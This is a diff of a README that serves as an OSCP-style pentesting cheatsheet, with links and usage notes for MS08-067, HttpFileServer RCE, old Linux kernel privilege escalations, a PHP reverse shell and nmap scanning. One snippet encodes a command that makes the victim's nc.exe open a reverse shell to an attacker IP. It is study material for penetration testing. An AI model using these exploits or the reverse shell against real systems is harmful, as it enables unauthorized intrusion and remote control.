@@ -1,32 +1,27 @@
 # cheatsheets and exploit code and scripts / OSCP
  
 
-##Windows Exploits
-<details><summary>MS08-067 Python Remote Exploit</summary>
+### Windows Exploits
+<details><summary>**MS08-067 Python Remote Exploit**</summary>
 <p>
 (https://www.exploit-db.com/exploits/40279)
 edit `shellcode` variable with payload and adjusts NOPS to fit it
 </p>
 </details>
-
 <details><summary>HttpFileServer 2.3.x RCE</summary>
 <p>
 Upload nc.exe into victim machine and performs a reverse shell using nc.exe
 ```python
-	
 	#change these to your webserver for uploading nc.exe
 	ip_addr = "192.168.1.20" 
 	local_port = "80" 
-	
 	#file will be uploaded to and run from C:\Users\Public, change ip and port here to catch your reverse shell
 	vbs3 = "C%3A%5CUsers%5CPublic%5Cnc.exe%20192.168.1.10%20443%20-e%20cmd.exe"
 ```
 </p>
 </details>
 
-
-
-##Linux Exploits
+### Linux Exploits
 <details><summary>Linux Kernel 2.2-4 PrivEsc (ptrace-kmod)</summary>
 <p>
 (https://www.exploit-db.com/exploits/3)
@@ -44,7 +39,6 @@ Works for 2.2.x and 2.4.x kernels.
 <p>
 (https://www.exploit-db.com/exploits/764)
 commented out `#COMMAND2` variable out to download. Can be used seperately with ptrace-kmod for PrivEsc.
-
 Usage:
 1. compile code
 `gcc -o openfuck openfuckV2.c -lcrypto`
@@ -56,12 +50,11 @@ _if you encounter missing ld error while compiling at victim machine, try checki
 </details>
 
 
-##Other Exploits
+### Other Exploits
 <details><summary>PHP Reverse Shell (pentest monkey)</summary>
 <p>
 (http://pentestmonkey.net/tools/web-shells/php-reverse-shell)
 Works like a charm in linux php LFI situations better than `system('<reverse shell bash code>');`
-
 1. modify code
 ```c
 $ip = '127.0.0.1';  // CHANGE THIS
@@ -73,12 +66,11 @@ $port = 1234;       // CHANGE THIS
 </details>
 
 
-##Tools
+### Tools
 <details><summary>Onetwopunch - wrapper for unicorn and nmap scan</summary>
 <p>
 (https://raw.githubusercontent.com/superkojiman/onetwopunch/master/onetwopunch.sh) 
 Scan for port using nicornscan (very fast) and chain it with nmap vuln nse script scan
-
 1. ping sweep for online hosts into list
 `nmap -v -sn 10.11.1-254 -oG all-hosts.txt`
 `grep Up all-hosts.txt > online.hosts.txt`
